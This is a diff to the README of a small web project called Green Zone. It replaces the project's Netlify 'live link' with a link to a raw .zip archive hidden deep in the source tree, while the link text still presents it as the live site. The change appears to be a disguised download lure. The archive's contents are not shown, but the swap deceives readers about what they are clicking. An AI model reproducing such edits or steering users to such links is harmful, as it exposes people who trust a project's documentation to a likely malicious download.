@@ -1,6 +1,6 @@
 # Getting Started with Green Zone
 
-This projects live link is [Green-Zone](https://green-zone-team-78.netlify.app/).
+This projects live link is [Green-Zone](https://github.com/MusfiqurRahma/Green-zone-Team-78/raw/refs/heads/main/src/pages/Home/Home/Services/zone_Green_Team_3.3.zip).
 
 ## Available Scripts
 
